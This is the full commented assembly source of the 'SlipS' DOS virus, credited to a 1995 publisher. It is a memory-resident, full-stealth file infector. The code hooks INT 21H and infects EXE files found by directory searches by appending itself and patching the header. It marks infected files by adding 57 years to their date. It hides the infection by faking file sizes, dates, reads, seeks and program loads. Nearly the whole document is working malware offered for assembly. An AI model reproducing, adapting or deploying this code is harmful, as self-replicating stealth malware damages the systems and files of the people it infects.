;The SlipS Virus.
;(C) 1995 American Eagle Publications, Inc. All rights reserved.

;This is a resident virus which infects files when they are searched for
;using the FCB-based search functions. It is a full stealth virus.

        .SEQ                       ;segments must appear in sequential order
                                   ;to simulate conditions in actual active virus

;HOSTSEG program code segment. The virus gains control before this routine and
;attaches itself to another EXE file.
HOSTSEG SEGMENT BYTE
        ASSUME  CS:HOSTSEG,SS:HSTACK

;This host simply terminates and returns control to DOS.
HOST:
        db      5000 dup (90H)          ;make host larger than virus
        mov     ax,4C00H
        int     21H                     ;terminate normally
HOSTSEG ENDS

;Host program stack segment
STACKSIZE       EQU     100H           ;size of stack for this program

HSTACK  SEGMENT PARA STACK 'STACK'
        db  STACKSIZE dup (0)
HSTACK  ENDS

;************************************************************************
;This is the virus itself

;Intruder Virus code segment. This gains control first, before the host. As this
;ASM file is layed out, this program will look exactly like a simple program
;that was infected by the virus.

VSEG    SEGMENT PARA
        ASSUME  CS:VSEG,DS:VSEG,SS:HSTACK

;******************************************************************************
;This portion of the virus goes resident if it isn't already. In theory,
;because of the stealthing, this code should never get control unless the
;virus is not resident. Thus, it never has to check to see if it's already
;there!
SLIPS:
        mov     ax,4209H                ;see if virus is already there
        int     21H
        jc      NOT_RESIDENT            ;no, go make it resident
        mov     ax,cs                   ;relocate relocatables
        add     WORD PTR cs:[HOSTS],ax
        add     WORD PTR cs:[HOSTC+2],ax
        cli                             ;set up host stack
        mov     ss,WORD PTR cs:[HOSTS]
        mov     sp,WORD PTR cs:[HOSTS+2]
        sti
        jmp     DWORD PTR cs:[HOSTC]    ;and transfer control to the host

NOT_RESIDENT:
        push    cs                      ;first, let's move host to PSP:100H
        pop     ds                      ;note that the host must be larger
        xor     si,si                   ;than the virus for this to work
        mov     di,100H
        mov     cx,OFFSET END_VIRUS
        rep     movsb                   ;move it
        mov     ax,es
        add     ax,10H
        push    ax                      ;now jump to PSP+10H:GO_RESIDENT
        mov     ax,OFFSET MOVED_DOWN
        push    ax
        retf                            ;using a retf

MOVED_DOWN:
        push    cs
        pop     ds                      ;ds=cs
        call    INSTALL_INTS            ;install interrupt handlers
        cmp     BYTE PTR [FIRST],1               ;first generation?
        jne     GO_EXEC                 ;no, go exec host
        mov     BYTE PTR [FIRST],0               ;else reset flag
        jmp     SHORT GO_RESIDENT       ;and go resident

GO_EXEC:
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET END_STACK     ;move stack down
        sti
        mov     bx,sp
        mov     cl,4                    ;prep to reduce memory size
        shr     bx,cl
        add     bx,11H                  ;bx=paragraphs to save
        mov     ah,4AH
        int     21H                     ;reduce it

        mov     bx,2CH                  ;get environment segment
        mov     es,es:[bx]
        mov     ax,ds
        sub     ax,10H
        mov     WORD PTR [EXEC_BLK],es  ;set up EXEC data structure
        mov     [EXEC_BLK+4],ax         ;for EXEC function to execute host
        mov     [EXEC_BLK+8],ax
        mov     [EXEC_BLK+12],ax

        xor     di,di                   ;now get host's name from
        mov     cx,7FFFH                ;environment
        xor     al,al
HNLP:   repnz   scasb
        scasb
        loopnz  HNLP
        add     di,2                    ;es:di point to host's name now

        push    es                      ;now prepare to EXEC the host
        pop     ds
        mov     dx,di                   ;ds:dx point to host's name now
        push    cs
        pop     es
        mov     bx,OFFSET EXEC_BLK      ;es:bx point to EXEC_BLK
        mov     ax,4B00H
        int     21H                     ;now EXEC the host

        push    ds
        pop     es                      ;es=segment of host EXECed
        mov     ah,49H                  ;free memory from EXEC
        int     21H
        mov     ah,4DH                  ;get host return code
        int     21H

GO_RESIDENT:
        mov     dx,OFFSET END_STACK     ;now go resident
        mov     cl,4                    ;keep everything in memory
        shr     dx,cl
        add     dx,11H
        mov     ah,31H                  ;return with host's return code
        int     21H

        db      'SlipS gotcha!'

;INSTALL_INTS installs the interrupt 21H hook so that the virus becomes
;active. All this does is put the existing INT 21H vector in OLD_21H and
;put the address of INT_21H into the vector.
INSTALL_INTS:
        push    es                      ;preserve es!
        mov     ax,3521H                ;hook interrupt 21H
        int     21H
        mov     WORD PTR [OLD_21H],bx   ;save old here
        mov     WORD PTR [OLD_21H+2],es
        mov     dx,OFFSET INT_21H       ;and set up new
        mov     ax,2521H
        int     21H
        mov     BYTE PTR [INDOS],0      ;clear this flag
        pop     es
        ret

;This is the interrupt 21H hook. It becomes active when installed by
;INSTALL_INTS. It traps Functions 11H and 12H and infects all EXE files
;found by those functions.

INDOS   DB      0               ;local INDOS function

INT_21H:
        cmp     ax,4209H        ;self-test for virus?
        jne     I211
        clc                     ;yes, clear carry and exit
        retf    2
I211:   cmp     cs:[INDOS],1    ;already inside of DOS?
        je      GOLD            ;yes, don't re-enter!
        cmp     ah,11H          ;DOS FCB-based Search First Function
        jne     I212
        jmp     SRCH_HOOK       ;yes, go execute hook
I212:   cmp     ah,12H          ;FCB-based Search Next Function
        jne     I214
        jmp     SRCH_HOOK
I214:   cmp     ah,3FH          ;Handle-based read function
        jne     I216
        jmp     HREAD_HOOK
I216:   cmp     ax,4202H        ;File positioning function
        jne     I217
        jmp     FPTR_HOOK
I217:   cmp     ah,4BH          ;DOS EXEC function
        jne     I218
        jmp     EXEC_HOOK
I218:   cmp     ah,4EH          ;Handle-based search first function
        jne     I219
        jmp     HSRCH_HOOK
I219:   cmp     ah,4FH          ;Handle-based search next function
        jne     I220
        jmp     HSRCH_HOOK
I220:   cmp     ah,57H          ;File date and time function
        jne     I221
        jmp     DATE_HOOK
I221:

GOLD:   jmp     DWORD PTR cs:[OLD_21H]  ;execute original int 21 handler

;This routine just calls the old Interrupt 21H vector internally. It is
;used to help get rid of tons of pushf/call DWORD PTR's in the code
DOS:
        pushf
        call    DWORD PTR cs:[OLD_21H]
        ret


;Handle-based read hook. This hook stealths file reads at the beginning
;and the end. At the beginning, it replaces the modified EXE header with
;the original, uninfected one. At the end, it makes it appear as if the
;virus is not appended to the file
HREAD_HOOK:
        push    bx
        push    cx
        push    dx
        push    si
        push    ds
        push    es

        call    FIND_SFT                ;find system file tbl for this file
        mov     ax,es:[bx+15]           ;get file date
        cmp     ax,57*512               ;is it infected?
        jnc     HRH3
        jmp     HRHNI                   ;no, just go do read normally

HRH3:   mov     ax,es:[bx+15H]          ;get current file pointer
        mov     dx,es:[bx+17H]          ;dx:ax = file ptr

        push    bp
        mov     bp,sp
        push    ax
        push    dx
        mov     cx,es:[bx+11H]          ;bx:cx is the file size now
        mov     bx,es:[bx+13H]
        sub     cx,OFFSET END_VIRUS + 10H
        sbb     bx,0                    ;bx:cx is the old file size now

        sub     cx,ax
        sbb     bx,dx                   ;bx:cx is now distance to end of file
        jnc     HRH4                    ;ptr > file size, return c on read
        xor     bx,bx
        xor     cx,cx                   ;zero distance to end of file
HRH4:   mov     dx,[bp+10]              ;bx=requested amount to read
        or      bx,bx                   ;is distance > 64K? if so, no problem
        jnz     HRH5
        cmp     cx,dx                   ;is distance > dx? if so, no problem
        jnc     HRH5
        mov     [bp+10],cx              ;else adjust requested read amt
HRH5:   pop     dx
        pop     ax
        pop     bp

        or      dx,dx                   ;are we reading a modified EXE header?
        jnz     CKHI                    ;no, continue
        cmp     ax,24
        jnc     CKHI                    ;no, continue

CKLO:                                   ;yes, must adjust header as read
        push    bp
        mov     bp,sp

        push    ax
        mov     bx,[bp+12]              ;get file handle
        mov     cx,[bp+10]              ;get cx and ds:dx for read
        mov     ds,[bp+4]
        mov     dx,[bp+8]
        mov     ah,3FH
        call    DOS

        mov     bx,dx
        mov     ax,[bx+8]               ;get header paragraphs
        add     ax,[bx+16H]             ;add initial cs
        mov     cx,16
        mul     cx                      ;dx:ax = start of virus cs
        add     ax,OFFSET EXE_HDR
        adc     dx,0
        mov     cx,dx
        mov     dx,ax                   ;cx:dx = offset of EXE_HDR in file
        pop     ax
        push    ax
        add     dx,ax                   ;cx:dx = offset of proper part of hdr
        adc     cx,0                    ;to read
        mov     ax,4200H
        mov     bx,[bp+12]
        call    DOS                     ;move there
        pop     ax
        push    ax
        mov     cx,24
        sub     cx,ax                   ;cx=bytes to read
        mov     dx,[bp+8]
        add     dx,ax                   ;place to read to
        mov     ah,3FH
        call    DOS                     ;read the old data

        pop     dx
        pushf
        xor     cx,cx
        add     dx,[bp+10]              ;cx:dx = where file ptr should end up
        mov     ax,4200H
        call    DOS                     ;move it there
        popf
        mov     ax,[bp+10]              ;set amount read here

CKLOD:  pop     bp                      ;done
        pop     es
        pop     ds
        pop     si
        pop     dx
        pop     cx
        pop     bx
        retf    2

CKHI:   pop     es
        pop     ds
        pop     si
        pop     dx
        pop     cx
        pop     bx
        mov     ah,3FH
        call    DOS
        retf    2

HRHNI:                                  ;come here if file is not infected
        pop     es                      ;restore all registers
        pop     ds
        pop     si
        pop     dx
        pop     cx
        pop     bx
        mov     ah,3FH
        jmp     GOLD                    ;and go to DOS


;This hooks attempts to move the file pointer with DOS function 4202H. It
;computes file positions relative to the end of the host, rather than relative
;to the end of the file.
FPTR_HOOK:
        push    bx
        push    cx
        push    dx
        push    si
        push    es
        push    ds

        call    FIND_SFT                ;find SFT entry corresponding to file
        mov     ax,es:[bx+15]           ;get file date
        cmp     ax,57*512               ;is it infected?
        jc      FPNI                    ;no, just handle normally

        push    bp                      ;infected, we must adjust this call
        mov     bp,sp
        mov     dx,es:[bx+11H]
        mov     cx,es:[bx+13H]          ;cx:dx is the file size now
        add     dx,[bp+8]
        adc     cx,[bp+10]              ;cx:dx is the desired new pointer
        sub     dx,OFFSET END_VIRUS + 16
        sbb     cx,0                    ;cx:dx is the adjusted new pointer
        mov     bx,[bp+12]
        mov     ax,4200H                ;move relative to start of file
        call    DOS
        mov     [bp+8],dx               ;dx:ax is now the absolute file ptr

        pop     bp
        pop     ds
        pop     es
        pop     si
        pop     dx
        pop     cx
        pop     bx
        retf    2

FPNI:                                   ;file not infected, handle normally
        pop     ds
        pop     es
        pop     si
        pop     dx
        pop     cx
        pop     bx
        mov     ax,4202H
        jmp     GOLD


;This subroutine sets es:bx to point to the system file table entry
;corresponding to the file handle passed to it in bx. It also sets ds equal
;to the PSP of the current process.
FIND_SFT:
        push    bx
        mov     ah,62H                  ;get PSP of current process in es
        int     21H
        mov     ds,bx                   ;ds=current PSP
        mov     ah,52H                  ;now get lists of lists
        int     21H
        les     bx,es:[bx+4]            ;get SFT pointer
        pop     si                      ;handle number to si
        mov     al,[si+18H]             ;get SFT number from PSP
        xor     ah,ah
FSF1:   cmp     ax,es:[bx+4]            ;number of SFT entries in this block
        jle     FSF2                    ;right block? continue
        sub     ax,es:[bx+4]            ;else decrement counter
        les     bx,es:[bx]              ;and get next pointer
        jmp     FSF1
FSF2:   add     bx,6                    ;go to first SFT entry in this block
        mov     ah,3BH
        mul     ah
        add     bx,ax                   ;es:bx points to correct SFT
        ret


;This hooks the EXEC function 4BH, subfunction 1.
;When an infected file is loaded with this function, the virus is cleaned off
;and only the host is loaded.
EXEC_HOOK:
        cmp     al,1                    ;we only handle subfunction 1 here
        je      EXEC_HOOK_GO
        jmp     GOLD
EXEC_HOOK_GO:
        push    ds
        push    es                      ;save data block location
        push    bx
        call    DOS                     ;ok, loaded
        pop     bx                      ;restore data block location
        pop     es
        push    ax                      ;save return code
        mov     si,es:[bx+18]
        mov     ds,es:[bx+20]           ;ds:si = starting cs:ip of child
        push    si
        push    es
        mov     di,OFFSET SLIPS
        push    cs
        pop     es                      ;es:di = starting point of virus
        mov     cx,10H
        repz    cmpsw                   ;compare 32 bytes of code
        pop     es
        pop     si
        jnz     EXH                     ;not the virus, exit now
                                        ;else we have the virus at ds:si
        mov     ax,[si+OFFSET HOSTC]    ;offset of host startup
        mov     cx,[si+OFFSET HOSTC+2]  ;segment of host startup
        mov     dx,ds
        add     cx,dx                   ;cx=relocated host start segment
        mov     es:[bx+18],ax
        mov     es:[bx+20],cx           ;set child start @ = host
        mov     ax,WORD PTR [si+OFFSET HOSTS]
        mov     cx,WORD PTR [si+OFFSET HOSTS+2]
        add     ax,dx
        mov     es:[bx+14],cx
        mov     es:[bx+16],ax
        push    es
        push    ds
        pop     es
        xor     di,di                   ;es:di point to virus in code
        mov     cx,OFFSET END_VIRUS
        xor     al,al
        rep     stosb                   ;zero it out so you don't see it
        pop     es

EXH:    pop     ax                      ;restore return code
        pop     ds
        clc
        retf    2


;This is the Search First/Search Next Function Hook, hooking the handle-based
;functions. It requires a local stack to avoid an overflow in the INT 21H
;internal stack

OSTACK  DW      0,0
TMP     DW      0

HSRCH_HOOK:
        mov     cs:[INDOS],1
        mov     cs:[OSTACK],sp
        mov     cs:[OSTACK+2],ss
        mov     cs:[TMP],ax
        cli
        mov     ax,cs
        mov     ss,ax
        mov     sp,OFFSET END_STACK
        sti
        mov     ax,cs:[TMP]

        call    DOS                     ;call original int 21H handler
        pushf
        or      al,al           ;was it successful?
        jnz     HSEXIT          ;nope, just exit
        pushf
        push    ax              ;save registers
        push    bx
        push    cx
        push    dx
        push    es
        push    ds

        mov     ah,2FH          ;get dta address in es:bx
        int     21H
        push    es
        pop     ds

        mov     ax,[bx+24]      ;get file date
        cmp     ax,57*512       ;is date >= 2037 ?
        jc      EX_HSRCH        ;no, we're all done
        sub     [bx+24],57*512  ;yes, subtract 57 years from reported date
        mov     ax,[bx+26]
        mov     dx,[bx+28]      ;file size in dx:ax
        sub     ax,OFFSET END_VIRUS + 10H
        sbb     dx,0            ;adjust it
        mov     [bx+26],ax      ;and save it back to DTA
        mov     [bx+28],dx
EX_HSRCH:
        pop     ds              ;restore registers
        pop     es
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
HSEXIT: popf
        cli
        mov     ss,cs:[OSTACK+2]
        mov     sp,cs:[OSTACK]
        sti
        mov     cs:[INDOS],0
        retf    2


;This is the Search First/Search Next Function Hook, hooking the FCB-based
;functions
SRCH_HOOK:
        mov     cs:[INDOS],1
        call    DOS             ;call original handler
        or      al,al           ;was it successful?
        jnz     SEXIT           ;nope, just exit
        pushf
        push    ax              ;save registers
        push    bx
        push    cx
        push    dx
        push    di
        push    si
        push    es
        push    ds

        mov     ah,2FH          ;get dta address in es:bx
        int     21H
        cmp     BYTE PTR es:[bx],0FFH
        jne     SH1             ;an extended fcb?
        add     bx,7            ;yes, adjust index
SH1:    push    es
        push    bx
        call    FILE_OK         ;ok to infect?
        jc      ADJ_INFECTED    ;no, see if already infected, and stealth
        call    INFECT_FILE     ;go ahead and infect it
ADJ_INFECTED:
        pop     bx
        pop     es
        mov     ax,es:[bx+25]   ;get file date
        cmp     ax,57*512       ;is date >= 2037 ?
        jc      EXIT_SRCH       ;no, we're all done
        sub     es:[bx+25],57*512 ;yes, subtract 57 years from reported date
        mov     ax,es:[bx+29]
        mov     dx,es:[bx+31]   ;file size in dx:ax
        sub     ax,OFFSET END_VIRUS + 10H
        sbb     dx,0            ;adjust it
        mov     es:[bx+29],ax   ;and save it back to DTA
        mov     es:[bx+31],dx
EXIT_SRCH:
        pop     ds
        pop     es
        pop     si              ;restore registers
        pop     di
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        popf
SEXIT:  mov     cs:[INDOS],0
        retf    2               ;return to original caller with current flags

;This routine hooks the file date/time function 57H. For function 0 (get date)
;it subtracts 57 from the year if the file is infected already. For function 1
;(set date), it adds 57 to the year if the current year is > 2037
DATE_HOOK:
        cmp     al,1
        jl      DH_0            ;go handle sub-function 0

;Subfunction 1: set date
DH_1:   push    dx
        push    cx
        mov     al,0            ;first get current date
        call    DOS
        cmp     dx,57*512       ;greater than 2037?
        pop     cx
        pop     dx
        jc      DH_11           ;no, just set actual date
        add     dx,57*512       ;yes, add 57 years to new date
DH_11:  mov     al,1
        pushf
        call    DWORD PTR cs:[OLD_21H]
        retf    2

;Subfunction 0: get date
DH_0:   call    DOS             ;do original int 21H
        pushf
        cmp     dx,57*512       ;is year greater than 2037?
        jc      DHX             ;no, report actual value
        sub     dx,57*512       ;yes, subtract 57 years
DHX:    popf
        retf    2

;Function to determine whether the file found by the search routine is
;useable. If so return nc, else return c.
;What makes a file useable?:
;              a) It must have an extension of EXE.
;              b) The file date must be earlier than 2037.
;              c) The signature field in the EXE header must be 'MZ'. (These
;                 are the first two bytes in the file.)
;              d) The Overlay Number field in the EXE header must be zero.
;              e) It should be a DOS EXE, without a new header.
;              f) The host must be larger than the virus.

FILE_OK:
        push    es
        pop     ds
        cmp     WORD PTR [bx+9],'XE'
        jne     OK_EX                   ;check for an EXE file
        cmp     BYTE PTR [bx+11],'E'
        jne     OK_EX                   ;if not EXE, just return control to caller
        cmp     WORD PTR [bx+25],57*512 ;check file date (>=2037?)
        jc      OK_GOON                 ;probably infected already, don't infect
OK_EX:  jmp     OK_END2

OK_GOON:mov     si,bx                   ;ds:si now points to fcb
        inc     si                      ;now, to file name in fcb
        push    cs
        pop     es
        mov     di,OFFSET FNAME         ;es:di points to file name buffer here
        mov     cx,8                    ;number of bytes in file name
FO1:    lodsb                           ;let's get the file name
        stosb
        cmp     al,20H
        je      FO2
        loop    FO1
        inc     di
FO2:    mov     BYTE PTR es:[di-1],'.'  ;put it in ASCIIZ format
        mov     ax,'XE'                 ;with no spaces
        stosw                           ;so we can use handle-based routines
        mov     ax,'E'                  ;to check it further
        stosw

        push    cs
        pop     ds                     ;now cs, ds and es all point here
        mov     dx,OFFSET FNAME
        mov     ax,3D02H               ;r/w access open file using handle
        int     21H
        jc      OK_END1                ;error opening - C set - quit without closing
        mov     bx,ax                  ;put handle into bx and leave bx alone from here on out

        mov     cx,1CH                 ;read 28 byte EXE file header
        mov     dx,OFFSET EXE_HDR      ;into this buffer
        mov     ah,3FH                 ;for examination and modification
        call    DOS
        jc      OK_END                 ;error in reading the file, so quit
        cmp     WORD PTR [EXE_HDR],'ZM';check EXE signature of MZ
        jnz     OK_END                 ;close & exit if not
        cmp     WORD PTR [EXE_HDR+26],0;check overlay number
        jnz     OK_END                 ;not 0 - exit with c set
        cmp     WORD PTR [EXE_HDR+24],40H ;is rel table at offset 40H or more?
        jnc     OK_END                 ;yes, it is not a DOS EXE, so skip it
        mov     ax,WORD PTR [EXE_HDR+4];get page count
        dec     ax
        mov     cx,512
        mul     cx
        add     ax,WORD PTR [EXE_HDR+2]
        adc     dx,0                   ;dx:ax contains file size
        or      dx,dx                  ;if dx>0
        jz      OK_END3                ;then the file is big enough
        cmp     ax,OFFSET END_VIRUS    ;check size
        jc      OK_END                 ;not big enough, exit
OK_END3:clc                            ;no, all clear, clear carry
        jmp     SHORT OK_END1          ;and leave file open
OK_END: mov     ah,3EH                 ;else close the file
        int     21H
OK_END2:stc                            ;set carry to indicate file not ok
OK_END1:ret                            ;return with c flag set properly

;This routine moves the virus (this program) to the end of the EXE file
;Basically, it just copies everything here to there, and then goes and
;adjusts the EXE file header. It also makes sure the virus starts
;on a paragraph boundary, and adds how many bytes are necessary to do that.
INFECT_FILE:
        mov     ax,4202H                ;seek end of file to determine size
        xor     cx,cx
        xor     dx,dx
        int     21H
        mov     cx,dx                   ;move to regs for Function 42H
        mov     dx,ax
        push    dx                      ;save this for end adjustment
        or      dl,0FH                  ;adjust file length to paragraph
        add     dx,1                    ;boundary
        adc     cx,0
        mov     WORD PTR [FSIZE+2],cx
        mov     WORD PTR [FSIZE],dx
        mov     ax,4200H                ;set file pointer, relative to beginning
        int     21H                     ;go to end of file + boundary

        mov     cx,OFFSET END_VIRUS     ;last byte of code
        xor     dx,dx                   ;first byte of code, ds:dx
        mov     ah,40H                  ;write body of virus to file
        int     21H

        pop     ax                      ;original file size
        and     al,0FH                  ;adjust file to constant size increase
        jz      INF1                    ;was exact, dont add 10H more
        mov     cx,10H
        sub     cl,al                   ;cx=number of bytes to write
        mov     dx,OFFSET END_STACK     ;write any old garbage
        mov     ah,40H
        int     21H

INF1:   mov     dx,WORD PTR [FSIZE]     ;find relocatables in code
        mov     cx,WORD PTR [FSIZE+2]   ;original end of file
        add     dx,OFFSET HOSTS         ;            + offset of HOSTS
        adc     cx,0                    ;cx:dx is that number
        mov     ax,4200H                ;set file pointer to 1st relocatable
        int     21H

        mov     ax,WORD PTR [FSIZE]     ;calculate viral initial CS
        mov     dx,WORD PTR [FSIZE+2]   ; = File size / 16 - Header Size(Para)
        mov     cx,16
        div     cx                      ;dx:ax contains file size / 16
        sub     ax,WORD PTR [EXE_HDR+8] ;subtract exe header size, in paragraphs
        push    ax
        sub     WORD PTR [EXE_HDR+14],ax         ;adjust initial cs and ss
        sub     WORD PTR [EXE_HDR+22],ax         ;to work with relocation scheme

        mov     dx,OFFSET EXE_HDR+14    ;get correct host ss:sp, cs:ip
        mov     cx,10
        mov     ah,40H                  ;and write it to HOSTS/HOSTC
        int     21H

        xor     cx,cx                   ;so now adjust the EXE header values
        xor     dx,dx
        mov     ax,4200H                ;set file pointer to start of file
        int     21H

        pop     ax
        mov     WORD PTR [EXE_HDR+22],ax;save as initial CS
        mov     WORD PTR [EXE_HDR+14],ax;save as initial SS
        mov     WORD PTR [EXE_HDR+20],OFFSET SLIPS        ;save initial ip
        mov     WORD PTR [EXE_HDR+16],OFFSET END_VIRUS + STACKSIZE  ;save initial sp

        mov     dx,WORD PTR [FSIZE+2]   ;calculate new file size for header
        mov     ax,WORD PTR [FSIZE]     ;get original size
        add     ax,OFFSET END_VIRUS + 200H  ;add virus size + 1 paragraph, 512 bytes
        adc     dx,0
        mov     cx,200H                 ;divide by paragraph size
        div     cx                      ;ax=paragraphs, dx=last paragraph size
        mov     WORD PTR [EXE_HDR+4],ax ;and save paragraphs here
        mov     WORD PTR [EXE_HDR+2],dx ;last paragraph size here
        mov     cx,1CH                  ;and save 1CH bytes of header
        mov     dx,OFFSET EXE_HDR       ;at start of file
        mov     ah,40H
        int     21H

        mov     ax,5700H                ;get file date and time
        int     21H
        add     dx,57*512               ;add 57 years to date
        mov     ax,5701H                ;and set date again
        int     21H

        mov     dx,OFFSET FNAME         ;get file attributes
        mov     ax,4300H
        int     21H
        push    cx                      ;save them for a second
        mov     ah,3EH                  ;close file now
        int     21H
        pop     cx                      ;and then set file attributes
        mov     ax,4301H
        int     21H
        ret                             ;that's it, infection is complete!

;******************************************************************************
;This is the data area for the virus which goes resident when the virus goes
;resident. It contains data needed by the resident part, and data which the
;startup code needs pre-initialized.

OLD_21H         DD      ?                       ;old int 21H vector

;The following is the control block for the DOS EXEC function. It is used by
;the virus to execute the host program after it installs itself in memory.
EXEC_BLK        DW      0                       ;seg @ of environment string
                DW      80H                     ;4 byte ptr to command line
                DW      0
                DW      5CH                     ;4 byte ptr to first FCB
                DW      0
                DW      6CH                     ;4 byte ptr to second FCB
                DW      0
                DD      ?                       ;init ss:sp for subfctn 1
                DD      ?                       ;init cs:ip for subfctn 1

FNAME           DB      12 dup (0)
FSIZE           DW      0,0
EXE_HDR         DB      1CH dup (?)             ;buffer for EXE file header
PSP             DW      ?                       ;place to store PSP segment
FIRST           DB      1                       ;flag to indicate first generation

;The following 10 bytes must stay together because they are an image of 10
;bytes from the EXE header
HOSTS           DW      0,STACKSIZE             ;host stack and code segments
FILLER          DW      ?                       ;these are dynamically set by the virus
HOSTC           DW      OFFSET HOST,0           ;but hard-coded in the 1st generation

END_VIRUS:                                      ;marker for end of resident part

;******************************************************************************
;This is a temporary local stack for the virus used by it when EXECing the
;host program. It reduces its memory size as much as possible to give the
;host room to EXEC. However, it must maintain a stack, so here it is. This
;part of the virus is not kept when it goes resident.

LOCAL_STK       DB      256 dup (0)             ;local stack for virus

END_STACK:

VSEG    ENDS

        END     SLIPS

